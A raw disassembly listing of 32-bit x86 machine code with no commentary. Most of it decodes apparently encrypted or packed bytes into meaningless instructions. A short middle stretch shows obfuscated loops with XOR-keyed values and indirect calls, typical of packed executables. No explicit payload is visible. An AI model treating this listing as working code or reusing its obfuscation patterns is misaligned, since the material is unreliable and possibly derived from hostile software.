  40a97a:	xchg   ebx,eax
  40a97b:	inc    ebx
  40a97c:	retf   0x50f9
  40a97f:	arpl   WORD PTR [edx+0xa36ac39],cx
  40a985:	dec    edx
  40a986:	mov    eax,DWORD PTR [ebp+0x4cf8a8e0]
  40a98c:	icebp  
  40a98d:	sub    DWORD PTR [eax-0x2c],ecx
  40a990:	mul    BYTE PTR [edx+0x3]
  40a993:	aas    
  40a994:	ins    BYTE PTR es:[edi],dx
  40a995:	int    0x7e
  40a997:	sar    BYTE PTR [esi+0x23],0x10
  40a99b:	jge    0x40aa0f
  40a99d:	push   cs
  40a99e:	cwde   
  40a99f:	icebp  
  40a9a0:	cmp    esp,eax
  40a9a2:	pop    edx
  40a9a3:	cdq    
  40a9a4:	inc    esp
  40a9a5:	aad    0xfb
  40a9a7:	adc    BYTE PTR [esi+0x7c],0xf3
  40a9ab:	out    0xf3,al
  40a9ad:	out    dx,al
  40a9ae:	sbb    ebp,edx
  40a9b0:	adc    BYTE PTR [esi],0x15
  40a9b3:	push   ebx
  40a9b4:	cmp    eax,0x29f9beb6
  40a9b9:	ja     0x40aa28
  40a9bb:	das    
  40a9bc:	jbe    0x40aa1d
  40a9be:	add    al,0x89
  40a9c0:	sahf   
  40a9c1:	(bad)  
  40a9c2:	arpl   WORD PTR [ebx],di
  40a9c4:	mul    eax
  40a9c6:	(bad)
  40a9cb:	mov    cs,ebx
  40a9cd:	je     0x40aa39
  40a9cf:	out    0x7b,eax
  40a9d1:	sub    al,BYTE PTR [edx+0x4f188034]
  40a9d7:	mov    esp,0x6ed093bb
  40a9dc:	ss out dx,eax
  40a9de:	out    dx,al
  40a9df:	mov    DWORD PTR [eax+0x51524fe9],ebx
  40a9e5:	and    eax,0xdcac8b4b
  40a9ea:	and    al,0x4f
  40a9ec:	fisttp DWORD PTR [esi]
  40a9ee:	cmp    ebp,DWORD PTR [ebx+0x333da749]
  40a9f4:	(bad)  
  40a9f5:	sub    al,0x2a
  40a9f7:	sbb    eax,0x433cfe5c
  40a9fc:	stc    
  40a9fd:	cs loope 0x40a9d7
  40aa00:	in     al,dx
  40aa01:	push   ds
  40aa02:	adc    BYTE PTR [ebx-0x3769fde6],cl
  40aa08:	cmp    BYTE PTR [esi-0xe],dl
  40aa0b:	pushf  
  40aa0c:	mov    bl,0x30
  40aa0e:	xchg   ecx,eax
  40aa0f:	sbb    eax,0x6ad1b0ab
  40aa14:	mov    ah,0xa8
  40aa16:	mov    bh,0x33
  40aa18:	xchg   ebp,eax
  40aa19:	inc    ebp
  40aa1a:	dec    eax
  40aa1b:	pop    esp
  40aa1c:	mov    DWORD PTR [esp+edx*8],esi
  40aa1f:	and    edx,DWORD PTR [ebx-0x536bc57c]
  40aa25:	in     al,0x3
  40aa27:	mov    edx,edx
  40aa29:	push   esi
  40aa2a:	xchg   esp,eax
  40aa2b:	dec    ebp
  40aa2c:	dec    ecx
  40aa2d:	mov    al,0xf0
  40aa2f:	jmp    0x40aa60
  40aa31:	retf   0xf3
  40aa34:	mov    ss,WORD PTR [esi+0x125128e0]
  40aa3a:	mov    ds:0x83a0c570,eax
  40aa3f:	lods   al,BYTE PTR ds:[esi]
  40aa40:	std    
  40aa41:	mov    cl,0xcc
  40aa43:	js     0x40aab9
  40aa45:	inc    edi
  40aa46:	loop   0x40aa79
  40aa48:	dec    edi
  40aa49:	and    al,0x3c
  40aa4b:	test   eax,eax
  40aa4d:	cmp    ch,cl
  40aa4f:	(bad)  
  40aa50:	mov    esp,0xfbdc0b87
  40aa55:	cmp    esi,0xb9a117f5
  40aa5b:	(bad)  
  40aa5c:	call   0xd6eacd7
  40aa61:	mov    eax,ds:0xc5dc06c4
  40aa66:	push   es
  40aa67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa68:	adc    al,0x80
  40aa6a:	mov    bl,0x7f
  40aa6c:	and    ecx,esp
  40aa6e:	cmc    
  40aa6f:	retf   
  40aa70:	mov    gs,edx
  40aa72:	jmp    0x280ef904
  40aa77:	xor    esp,DWORD PTR [ecx]
  40aa79:	mov    bh,0x41
  40aa7b:	and    DWORD PTR [ebx],eax
  40aa7d:	popa   
  40aa7e:	add    ch,BYTE PTR [edx]
  40aa80:	mov    ah,0x4b
  40aa82:	xchg   DWORD PTR [edi-0x6287cef],eax
  40aa88:	xchg   ebp,eax
  40aa89:	xchg   ebx,eax
  40aa8a:	push   es
  40aa8b:	and    dh,BYTE PTR [eax-0x3d118074]
  40aa91:	dec    eax
  40aa92:	ror    BYTE PTR [ecx],1
  40aa94:	dec    esp
  40aa95:	push   ss
  40aa96:	adc    eax,DWORD PTR [ecx+edi*1]
  40aa99:	adc    eax,0x86616b1b
  40aa9e:	js     0x40aaf0
  40aaa0:	in     al,dx
  40aaa1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aaa2:	add    DWORD PTR [ecx+0x5d],ebx
  40aaa5:	cmp    bh,BYTE PTR [ecx-0xd]
  40aaa8:	xchg   ebx,eax
  40aaa9:	xchg   esp,eax
  40aaaa:	cmp    DWORD PTR gs:[ecx],0x3d
  40aaae:	cli    
  40aaaf:	xchg   edx,eax
  40aab0:	rcl    DWORD PTR [ecx],1
  40aab2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aab3:	in     al,0x15
  40aab5:	xlat   BYTE PTR ds:[ebx]
  40aab6:	fistp  WORD PTR [ecx]
  40aab8:	call   0x98976cc9
  40aabd:	mov    dh,0x7f
  40aabf:	(bad)  
  40aac0:	jnp    0x40ab1a
  40aac2:	call   0x379f:0xa3eaf9ca
  40aac9:	outs   dx,BYTE PTR ds:[esi]
  40aaca:	mov    ch,0xe8
  40aacc:	ja     0x40aa89
  40aace:	push   ebp
  40aacf:	call   0x38211ba6
  40aad4:	(bad)  
  40aad5:	int    0xb
  40aad7:	xor    al,0xb3
  40aad9:	cmc    
  40aada:	pop    edi
  40aadb:	mov    cl,0x17
  40aadd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aade:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aadf:	rol    edx,0xfc
  40aae2:	fldcw  WORD PTR [edi-0x11]
  40aae5:	xor    edx,DWORD PTR [edi+0x68]
  40aae8:	jmp    0x40aab6
  40aaea:	cdq    
  40aaeb:	cli    
  40aaec:	inc    ebx
  40aaed:	retf   
  40aaee:	clc    
  40aaef:	xor    esp,DWORD PTR [eax+ebp*1-0xad32ff1]
  40aaf6:	and    BYTE PTR [ebp-0xaf5ce98],ah
  40aafc:	sub    DWORD PTR [esi],ebx
  40aafe:	xchg   edi,eax
  40aaff:	sahf   
  40ab00:	idiv   DWORD PTR [esp+ecx*2-0x3a4e9d5d]
  40ab07:	jl     0x40aa9e
  40ab09:	xlat   BYTE PTR ds:[ebx]
  40ab0a:	mov    dh,BYTE PTR [ebp+0xa]
  40ab0d:	rcr    DWORD PTR [eax+0x6e],0xb1
  40ab11:	pop    ss
  40ab12:	inc    edx
  40ab13:	add    ecx,eax
  40ab15:	aas    
  40ab16:	add    DWORD PTR [ebx+0x638172be],ebp
  40ab1c:	(bad)  
  40ab1d:	mov    esp,0x5e86155
  40ab22:	test   eax,0xc378e23b
  40ab27:	popf   
  40ab28:	sbb    eax,0x6d987ea8
  40ab2d:	dec    esp
  40ab2e:	aas    
  40ab2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab30:	sub    cl,BYTE PTR [esi-0x70962090]
  40ab36:	inc    ebp
  40ab37:	sbb    dl,0x21
  40ab3a:	rcl    DWORD PTR [edi-0x49d454ba],1
  40ab40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab41:	sahf   
  40ab42:	aaa    
  40ab43:	repz xchg bl,dl
  40ab46:	add    al,0xc4
  40ab48:	jmp    0xe708:0x3ed9e304
  40ab4f:	pop    edx
  40ab50:	mov    ecx,0x773e99e6
  40ab55:	sti    
  40ab56:	frstor [edi-0x13]
  40ab59:	adc    bh,BYTE PTR [eax+edi*1-0x5be3d9f4]
  40ab60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab61:	loope  0x40ab70
  40ab63:	adc    eax,0xc5a882c0
  40ab68:	mov    edx,0x29546e3
  40ab6d:	pushf  
  40ab6e:	hlt    
  40ab6f:	pop    esp
  40ab70:	jmp    0x68f9:0xf346afa9
  40ab77:	addr16 jbe 0x40ab55
  40ab7a:	imul   eax,ebp,0xc9092a35
  40ab80:	ds pop ds
  40ab82:	dec    edi
  40ab83:	add    BYTE PTR [ebp-0x5a],ch
  40ab86:	jnp    0x40ab7d
  40ab88:	mov    ds:0x19a5c9ec,eax
  40ab8d:	sar    DWORD PTR [ebx+0x7c],0xa7
  40ab91:	pop    esp
  40ab92:	pop    ds
  40ab93:	pop    ecx
  40ab94:	(bad)  
  40ab96:	xchg   edx,eax
  40ab97:	je     0x40abe3
  40ab99:	ret    
  40ab9a:	xchg   ebp,eax
  40ab9b:	cmovl  ebx,DWORD PTR [esi+0x62a7ae73]
  40aba2:	or     ecx,DWORD PTR [ebp-0x36820521]
  40aba8:	rcl    bh,0x4a
  40abab:	adc    eax,0x6ce004e1
  40abb0:	or     dh,bh
  40abb2:	inc    ecx
  40abb3:	or     bh,0xf3
  40abb6:	cli    
  40abb7:	test   eax,0xe504f62c
  40abbc:	adc    DWORD PTR ds:0x26f62792,0x82552d55
  40abc6:	stos   DWORD PTR es:[edi],eax
  40abc7:	pop    ds
  40abc8:	popf   
  40abc9:	pop    ss
  40abca:	jmp    edi
  40abcc:	inc    esp
  40abcd:	in     al,dx
  40abce:	mov    al,0x89
  40abd0:	mov    ah,0x2e
  40abd2:	mov    dh,0x3f
  40abd4:	pop    ds
  40abd5:	mov    esi,0x928498e2
  40abda:	sbb    DWORD PTR [ebp+0x0],esp
  40abdd:	rcl    BYTE PTR [ebx],1
  40abdf:	sub    eax,0xff4b7c3b
  40abe4:	xchg   edi,eax
  40abe5:	xchg   edx,eax
  40abe6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40abe7:	push   cs
  40abe8:	cld    
  40abe9:	dec    edx
  40abea:	fcomp  QWORD PTR [edx+eax*1]
  40abed:	or     ecx,DWORD PTR [ebx-0x21]
  40abf0:	sub    eax,0x5b30494
  40abf5:	fistp  QWORD PTR [ecx]
  40abf7:	mov    ch,0xcf
  40abf9:	mov    ebp,0x52df41f3
  40abfe:	scas   al,BYTE PTR es:[edi]
  40abff:	pop    edx
  40ac00:	xor    edx,eax
  40ac02:	xor    DWORD PTR ds:0x42fcf5,0x42e70f
  40ac0c:	add    edx,ecx
  40ac0e:	mov    DWORD PTR ds:0x42e703,0x189b
  40ac18:	cmp    edi,edx
  40ac1a:	mov    DWORD PTR ds:0x42fcdd,0x36a4
  40ac24:	jb     0x40d88a
  40ac2a:	mov    edx,DWORD PTR [ebp-0x28]
  40ac2d:	sbb    DWORD PTR ds:0x42fd7e,ebx
  40ac33:	mov    edi,DWORD PTR [ebp-0x4]
  40ac36:	xor    edx,eax
  40ac38:	sub    DWORD PTR ds:0x42fcf5,edx
  40ac3e:	xor    edi,eax
  40ac40:	mov    DWORD PTR ds:0x42e6f7,0x1f
  40ac4a:	cmp    DWORD PTR ds:0x42e6f7,0x0
  40ac51:	je     0x40acfa
  40ac57:	cmp    DWORD PTR ds:0x42e6f7,0x2e
  40ac5e:	jne    0x40ac7d
  40ac64:	push   DWORD PTR [ebp-0xc]
  40ac67:	push   0x42e23d
  40ac6c:	push   DWORD PTR [ebp-0x24]
  40ac6f:	push   0x691a
  40ac74:	push   DWORD PTR [ebp-0x10]
  40ac77:	call   DWORD PTR ds:0x42e2f3
  40ac7d:	mov    ebx,DWORD PTR ds:0x42e6f7
  40ac83:	dec    ebx
  40ac84:	mov    DWORD PTR ds:0x42e6f7,ebx
  40ac8a:	jmp    0x40ac4a
  40ac8f:	and    DWORD PTR ds:0x42e128,0x0
  40ac99:	jmp    0x40acad
  40ac9e:	xor    ebx,ebx
  40aca0:	or     ebx,DWORD PTR ds:0x42e128
  40aca6:	inc    ebx
  40aca7:	mov    DWORD PTR ds:0x42e128,ebx
  40acad:	cmp    DWORD PTR ds:0x42e128,0x1a
  40acb4:	jae    0x40acfa
  40acba:	cmp    DWORD PTR ds:0x42e128,0xc
  40acc1:	jne    0x40acd5
  40acc7:	push   0x2dd0
  40accc:	push   DWORD PTR [ebp-0x14]
  40accf:	call   DWORD PTR ds:0x42e2f7
  40acd5:	cmp    DWORD PTR ds:0x42e128,0xb
  40acdc:	jne    0x40acef
  40ace2:	mov    ebx,DWORD PTR ds:0x42e128
  40ace8:	inc    ebx
  40ace9:	mov    DWORD PTR ds:0x42e128,ebx
  40acef:	jmp    0x40ac9e
  40acf4:	adc    ebx,0x2885
  40acfa:	add    edi,ecx
  40acfc:	sbb    ebx,0x5c75
  40ad02:	add    edx,ecx
  40ad04:	imul   edx,edi
  40ad07:	sub    ebx,DWORD PTR ds:0x42e134
  40ad0d:	mov    edi,DWORD PTR [ebp-0x8]
  40ad10:	mov    DWORD PTR ds:0x42fce1,0x13
  40ad1a:	cmp    DWORD PTR ds:0x42fce1,0x0
  40ad21:	je     0x40ad54
  40ad27:	cmp    DWORD PTR ds:0x42fce1,0x14
  40ad2e:	jne    0x40ad42
  40ad34:	push   DWORD PTR [ebp-0x28]
  40ad37:	push   0x42fd01
  40ad3c:	call   DWORD PTR ds:0x42e54b
  40ad42:	mov    ebx,DWORD PTR ds:0x42fce1
  40ad48:	dec    ebx
  40ad49:	mov    DWORD PTR ds:0x42fce1,ebx
  40ad4f:	jmp    0x40ad1a
  40ad54:	mov    ebx,DWORD PTR [ebp-0x10]
  40ad57:	sub    ebx,edi
  40ad59:	cmp    ebx,edx
  40ad5b:	ja     0x40ad6d
  40ad61:	mov    edx,DWORD PTR [ebp-0x4]
  40ad64:	xor    edx,eax
  40ad66:	add    edx,ecx
  40ad68:	jmp    0x40c0fc
  40ad6d:	mov    edx,DWORD PTR [ebp-0x2c]
  40ad70:	mov    edi,DWORD PTR [ebp-0x4]
  40ad73:	xor    edx,eax
  40ad75:	xor    edi,eax
  40ad77:	add    edi,ecx
  40ad79:	add    edx,ecx
  40ad7b:	imul   edx,edi
  40ad7e:	mov    edi,DWORD PTR [ebp-0x8]
  40ad81:	mov    ebx,DWORD PTR [ebp-0x10]
  40ad84:	sub    ebx,edi
  40ad86:	cmp    ebx,edx
  40ad88:	ja     0x40ad96
  40ad8e:	mov    edx,DWORD PTR [ebp-0x28]
  40ad91:	jmp    0x40c0ee
  40ad96:	mov    edx,DWORD PTR [ebp-0x30]
  40ad99:	mov    edi,DWORD PTR [ebp-0x4]
  40ad9c:	xor    edx,eax
  40ad9e:	xor    edi,eax
  40ada0:	add    edi,ecx
  40ada2:	jmp    0x40b160
  40ada7:	xor    BYTE PTR [eax+eiz*4],bl
  40adaa:	mov    bh,0x6c
  40adac:	mov    bl,0xc7
  40adae:	jae    0x40ae09
  40adb0:	jg     0x40ad82
  40adb2:	ja     0x40ad4c
  40adb4:	dec    ebx
  40adb5:	and    edx,DWORD PTR [ecx+0x7070fd03]
  40adbb:	lahf   
  40adbc:	jge    0x40ae2e
  40adbe:	jo     0x40adcc
  40adc0:	push   0xffffff89
  40adc2:	mov    ds:0xbb156de3,eax
  40adc7:	xchg   edi,eax
  40adc8:	jnp    0x40adf6
  40adca:	leave  
  40adcb:	repz mov ebx,0xb63bc1be
  40add1:	cmp    eax,0x6c19682a
  40add6:	lds    esp,FWORD PTR [eax]
  40add8:	sahf   
  40add9:	ja     0x40ad69
  40addb:	setg   BYTE PTR [edi-0x316c50b7]
  40ade2:	(bad)  
  40ade3:	mov    ebx,0x1b220cfb
  40ade8:	pushf  
  40ade9:	mov    edx,0xb2b19990
  40adee:	xchg   edx,eax
  40adef:	jmp    0x5867:0x81d23b72
  40adf6:	mov    ch,0xa9
  40adf8:	(bad)  
  40adf9:	mov    dl,0xe5
  40adfb:	cli    
  40adfc:	xor    ah,BYTE PTR [edi+0x6e277255]
  40ae02:	inc    ecx
  40ae03:	mov    eax,0x3f46d296
  40ae08:	pop    esi
  40ae09:	xchg   edx,eax
  40ae0a:	popf   
  40ae0b:	cmp    eax,0x86788d1d
  40ae10:	lock xchg ebx,eax
  40ae12:	icebp  
  40ae13:	fstp   TBYTE PTR [edx+0x67127bb1]
  40ae19:	pop    ebp
  40ae1a:	inc    ecx
  40ae1b:	xchg   ebp,eax
  40ae1c:	fist   DWORD PTR [esi-0x6c]
  40ae1f:	xchg   ebp,eax
  40ae20:	es mov edx,ds
  40ae23:	fdiv   QWORD PTR [edi]
  40ae25:	jmp    0xb536:0x2bd8db42
  40ae2c:	jne    0x40adc2
  40ae2e:	or     al,0x4c
  40ae30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae31:	fisttp QWORD PTR [ebx]
  40ae33:	fistp  DWORD PTR [edx+0x33a38aee]
  40ae39:	push   0xfffffffe
  40ae3b:	xchg   ebx,eax
  40ae3c:	push   ds
  40ae3d:	inc    esp
  40ae3e:	mov    bl,0x77
  40ae40:	jo     0x40ae28
  40ae42:	and    DWORD PTR [ecx+0x3f],ecx
  40ae45:	cmp    eax,0x126fb6db
  40ae4a:	ss in  eax,dx
  40ae4c:	pop    ds
  40ae4d:	push   ebx
  40ae4e:	and    al,0x6c
  40ae50:	cmp    al,BYTE PTR [esi+0x1d210c5c]
  40ae56:	xchg   edi,eax
  40ae57:	and    eax,0x97eb43b6
  40ae5c:	in     eax,0x4d
  40ae5e:	fsub   QWORD PTR [ecx]
  40ae60:	push   es
  40ae61:	aas    
  40ae62:	lods   eax,DWORD PTR ds:[esi]
  40ae63:	or     edi,DWORD PTR [ebx+0x67a2411d]
  40ae69:	fldcw  WORD PTR [edi-0x7e1e640e]
  40ae6f:	mov    eax,ds:0x405b2008
  40ae74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae75:	std    
  40ae76:	repz mov bl,ah
  40ae79:	jb     0x40ae88
  40ae7b:	cmp    DWORD PTR [eax-0x2f],eax
  40ae7e:	mov    cl,0x95
  40ae80:	shl    edx,0xb0
  40ae83:	mov    edi,0x9ae83786
  40ae88:	jle    0x40ae0a
  40ae8a:	ss jmp 0x8ea1ab0f
  40ae90:	add    DWORD PTR [esi+0x377a3ed8],ebp
  40ae96:	repz dec esp
  40ae98:	js     0x40aed9
  40ae9a:	add    DWORD PTR [ebp+0x1c145323],ecx
  40aea0:	push   ebx
  40aea1:	ins    DWORD PTR es:[edi],dx
  40aea2:	dec    ebp
  40aea3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aea4:	es xchg ebx,eax
  40aea6:	add    BYTE PTR [eax],cl
  40aea8:	in     eax,0x83
  40aeaa:	jne    0x40aed6
  40aeac:	(bad)  
  40aead:	xchg   esp,eax
  40aeae:	pusha  
  40aeaf:	icebp  
  40aeb0:	repz loopne 0x40aef7
  40aeb3:	sub    DWORD PTR [ebx+0x46a3ef74],edi
  40aeb9:	enter  0xa1a7,0xd7
  40aebd:	inc    edx
  40aebe:	fcmovbe st,st(1)
  40aec0:	cmp    DWORD PTR ds:0x7783a1ab,ebp
  40aec6:	mov    eax,ds:0x10b1bfbc
  40aecb:	xchg   ebx,eax
  40aecc:	cmp    BYTE PTR [edi+0x23],0x1b
  40aed0:	push   cs
  40aed1:	cs addr16 (bad) 
  40aed5:	lds    ebx,FWORD PTR [edi-0x2a61288]
  40aedb:	jl     0x40aea5
  40aedd:	xor    BYTE PTR [eax-0x2b],dh
  40aee0:	sub    al,0x12
  40aee2:	and    DWORD PTR [esi-0x39],0xffffffb2
  40aee6:	adc    ebp,DWORD PTR [ecx-0x51]
  40aee9:	inc    sp
  40aeeb:	repz inc ebx
  40aeed:	cmp    BYTE PTR [ecx],cl
  40aeef:	scas   al,BYTE PTR es:[edi]
  40aef0:	lea    eax,[edi+0x3b]
  40aef3:	lds    edx,FWORD PTR [esi+0x3c]
  40aef6:	mov    bl,0x8b
  40aef8:	mov    eax,es
  40aefa:	or     BYTE PTR [edx],ah
  40aefc:	loop   0x40af45
  40aefe:	sti    
  40aeff:	mov    cl,0x81
  40af01:	aaa    
  40af02:	ret    
  40af03:	rcl    DWORD PTR [edx+0x7a],1
  40af06:	aad    0xcb
  40af08:	enter  0x94b3,0x4f
  40af0c:	mov    ds:0xef1d1233,al
  40af11:	in     eax,0xef
  40af13:	cmp    esi,DWORD PTR [ecx]
  40af15:	mov    gs,WORD PTR [ecx]
  40af17:	cmp    dl,BYTE PTR [edx+0x27]
  40af1a:	dec    edi
  40af1b:	mov    al,ds:0x4771e180
  40af20:	(bad)  
  40af21:	pop    eax
  40af22:	ins    DWORD PTR es:[edi],dx
  40af23:	dec    edx
  40af24:	mov    ah,0xed
  40af26:	jb     0x40af44
  40af28:	or     DWORD PTR [ebp+0x67],0xffffff80
  40af2c:	inc    ecx
  40af2d:	ins    DWORD PTR es:[edi],dx
  40af2e:	loope  0x40aef9
  40af30:	(bad)  
  40af32:	shl    ch,1
  40af34:	adc    BYTE PTR [eax+ebx*2],0x1f
  40af38:	mov    al,ds:0xbbf28360
  40af3d:	ficomp DWORD PTR [ecx+esi*1-0x7243040e]
  40af44:	pusha  
  40af45:	add    eax,0x10b473cb
  40af4a:	inc    ebp
  40af4b:	inc    ebp
  40af4c:	ds or  ecx,0x74a53014
  40af53:	push   edi
  40af54:	stos   BYTE PTR es:[edi],al
  40af55:	std    
  40af56:	or     edx,DWORD PTR [edi]
  40af58:	fwait
  40af59:	scas   eax,DWORD PTR es:[edi]
  40af5a:	and    al,0x7b
  40af5c:	aam    0xf2
  40af5e:	jl     0x40af62
  40af60:	dec    edi
  40af61:	shl    BYTE PTR [ecx-0x67],0x1b
  40af65:	pcmpgtb mm7,QWORD PTR [eax+0x2b]
  40af69:	mov    ds:0x4e98e7bd,al
  40af6e:	retf   0x9b03
  40af71:	(bad)  
  40af72:	in     eax,0xc3
  40af74:	mov    BYTE PTR [edi+esi*4],bl
  40af77:	pop    ebp
  40af78:	or     dl,BYTE PTR [eax+0x3a96a393]
  40af7e:	bound  edx,QWORD PTR [edi]
  40af80:	lahf   
  40af81:	pop    ecx
  40af82:	ror    DWORD PTR [ebp-0x2a9caa26],cl
  40af88:	sbb    esi,ebx
  40af8a:	jnp    0x40afdb
  40af8c:	jle    0x40af59
  40af8e:	fdivr  st(2),st
  40af90:	fld    TBYTE PTR [edi+0x76]
  40af93:	test   DWORD PTR [ebx+esi*8+0x57481d2c],eax
  40af9a:	jae    0x40af2f
  40af9c:	and    eax,0x1944992f
  40afa1:	push   0xb8aecc1a
  40afa6:	add    ch,BYTE PTR [ecx-0x8]
  40afa9:	cmc    
  40afaa:	(bad)  
  40afab:	js     0x40aff6
  40afad:	xchg   edi,eax
  40afae:	(bad)  
  40afb0:	jmp    DWORD PTR [ecx-0x1fd55459]
  40afb6:	dec    eax
  40afb7:	or     al,0x5a
  40afb9:	push   ecx
  40afba:	into   
  40afbb:	add    ch,0x7c
  40afbe:	sub    ecx,edi
  40afc0:	push   0x3d
  40afc2:	cmp    DWORD PTR [ebx],0xffffffdf
  40afc5:	adc    eax,0xb29959af
  40afca:	and    DWORD PTR [edi-0x91b881],0x9ef5dbac
  40afd4:	jns    0x40b032
  40afd6:	xor    DWORD PTR [esi+0x17],0xffffff8d
  40afda:	aaa    
  40afdb:	pushf  
  40afdc:	or     eax,0x5d98e4d1
  40afe1:	or     eax,0x65fdec7c
  40afe6:	hlt    
  40afe7:	outs   dx,DWORD PTR ds:[esi]
  40afe8:	std    
  40afe9:	es dec esi
  40afeb:	mov    esp,0x8a0f9435
  40aff0:	pop    ebx
  40aff1:	jno    0x40b06c
  40aff3:	lock and eax,0x56acec58
  40aff9:	lock loopne 0x40b077
  40affc:	je     0x40b05f
  40affe:	outs   dx,DWORD PTR ds:[esi]
  40afff:	jo     0x40affe
  40b001:	mov    ds,eax
  40b003:	add    esi,ebp
  40b005:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b006:	xor    DWORD PTR [edx+0x5e],0x80671b62
  40b00d:	jle    0x40afd2
  40b00f:	add    al,0x99
  40b011:	ins    DWORD PTR es:[edi],dx
  40b012:	mov    al,ds:0xd73da7a1
  40b017:	push   es
  40b018:	sbb    al,0x38
  40b01a:	stos   DWORD PTR es:[edi],eax
  40b01b:	jnp    0x40afa5
  40b01d:	sub    al,0x7e
  40b01f:	sti    
  40b020:	mov    al,0x71
  40b022:	sub    ah,dl
  40b024:	and    esp,edi
  40b026:	mov    ebx,0x31044eb9
  40b02b:	sbb    DWORD PTR [ebp-0x25],ebp
  40b02e:	test   DWORD PTR [esi+ecx*8+0x22a6bef6],ebp
  40b035:	aad    0x8f
  40b037:	mov    ?,WORD PTR [ebp-0x3ae62e10]
  40b03d:	ss xchg esp,eax
  40b03f:	xchg   edi,eax
  40b040:	inc    edi
  40b041:	inc    edx
  40b042:	cmp    DWORD PTR [esi-0x32d756c8],edx
  40b048:	aad    0xb6
  40b04a:	mov    ebx,0x80f83a68
  40b04f:	pop    ebx
  40b050:	ja     0x40afe5
  40b052:	data16 setne BYTE PTR [ebx+ebp*4-0x66eb9ae3]
  40b05b:	xor    edx,DWORD PTR [ecx+0x30b82a19]
  40b061:	sbb    BYTE PTR [ecx],dl
  40b063:	leave  
  40b064:	and    DWORD PTR [ebp+ebx*1-0x42],ecx
  40b068:	(bad)  
  40b069:	sub    ebp,DWORD PTR [ecx]
  40b06b:	cmp    dh,dh
  40b06d:	dec    edi
  40b06e:	adc    BYTE PTR [esp+edi*1-0x1e842e03],cl
  40b075:	sbb    al,0x1
  40b077:	add    eax,0x8738ed70
  40b07c:	sbb    BYTE PTR [ebp+ebx*2-0x3b],cl
  40b080:	xchg   esp,eax
  40b081:	xor    edi,DWORD PTR [ecx+0x68]
  40b084:	mov    al,ds:0x32ead4bc
  40b089:	adc    al,0xdc
  40b08b:	sbb    ch,BYTE PTR [esp+ecx*2-0x754a89df]
  40b092:	sbb    eax,0x804435dd
  40b097:	push   0xb964357
  40b09c:	fidivr WORD PTR [ecx-0x23]
  40b09f:	cmp    dl,BYTE PTR [ecx+0x1b]
  40b0a2:	add    BYTE PTR [eax-0x26],ch
  40b0a5:	xor    BYTE PTR [ebp+0x79],cl
  40b0a8:	into   
  40b0a9:	pushf  
  40b0aa:	push   ebp
  40b0ab:	test   edi,0xdbb7adc
  40b0b1:	arpl   sp,bp
  40b0b3:	and    eax,0x3578a9cc
  40b0b8:	stos   BYTE PTR es:[edi],al
  40b0b9:	sti    
  40b0ba:	outs   dx,BYTE PTR ds:[esi]
  40b0bb:	stos   BYTE PTR es:[edi],al
  40b0bc:	pop    eax
  40b0bd:	xchg   ecx,eax
  40b0be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0bf:	sub    eax,0x87c3d871
  40b0c4:	ror    BYTE PTR [ebp+edi*1-0xa],cl
  40b0c8:	push   esi
  40b0c9:	sahf   
  40b0ca:	push   edx
  40b0cb:	(bad)  [ebx]
  40b0cd:	iret   
  40b0ce:	push   ecx
  40b0cf:	add    BYTE PTR [ebp+0x3ccfc80e],ch
  40b0d5:	mov    al,0x7
  40b0d7:	mov    ebx,0x407011e9
  40b0dc:	add    DWORD PTR [edx],esp
  40b0de:	push   eax
  40b0df:	cld    
  40b0e0:	imul   edi,DWORD PTR [esi+ebx*1+0x6b],0x50
  40b0e5:	mov    edi,0x4b2595f2
  40b0ea:	shr    BYTE PTR [esi+0x47d6d2fb],0x1f
  40b0f1:	cmc    
  40b0f2:	bound  ebp,QWORD PTR ds:0xd9a851b6
  40b0f8:	pushf  
  40b0f9:	inc    ecx
  40b0fa:	cld    
  40b0fb:	inc    ebp
  40b0fc:	pop    ebp
  40b0fd:	jmp    0x8980:0x9a663eb6
  40b104:	jnp    0x40b14d
  40b106:	pop    eax
  40b107:	mov    esi,0xda22caa
  40b10c:	inc    eax
  40b10d:	sbb    DWORD PTR [ecx-0x40],ebx
  40b110:	int3   
  40b111:	mov    ds:0xa2c8125,al
  40b116:	fadd   QWORD PTR [ebx-0x48]
  40b119:	idiv   BYTE PTR [edi]
  40b11b:	addr16 jae 0x40b164
  40b11e:	pop    ebx
  40b11f:	jo     0x40b0cf
  40b121:	ja     0x40b103
  40b123:	in     al,dx
  40b124:	jge    0x40b1a1
  40b126:	(bad)  
  40b127:	jae    0x40b11c
  40b129:	leave  
  40b12a:	pop    ss
  40b12b:	mov    esi,0x7fbc56d2
  40b130:	sub    BYTE PTR [ebx],cl
  40b132:	sbb    DWORD PTR [ebx],ebp
  40b134:	popf   
  40b135:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b136:	lea    esi,[esi]
  40b138:	mov    ds:0xa87e26a5,al
  40b13d:	push   edi
  40b13e:	lds    ecx,FWORD PTR [esi-0x2c]
  40b141:	cmp    eax,0xb299466f
  40b146:	cs xchg esp,eax
  40b148:	sar    esp,1
  40b14a:	sub    al,0x68
  40b14c:	inc    ebp
  40b14d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b14e:	pop    ss
  40b14f:	or     ah,bl
  40b151:	mov    dh,0x37
  40b153:	xchg   ebx,eax
  40b154:	adc    al,BYTE PTR [edx-0x59d2dd4b]
  40b15a:	inc    eax
  40b15b:	sbb    ah,BYTE PTR ds:0x36ca684
  40b161:	shr    ecx,1
  40b163:	mov    ecx,0xd2000003
  40b168:	jne    0x40b1a1
  40b16a:	sub    esi,DWORD PTR [ebx-0x188a2d97]
  40b170:	retf   0xa792
  40b173:	aas    
  40b174:	pop    eax
  40b175:	mov    dh,0x46
  40b177:	mov    ds:0x9f7070fa,al
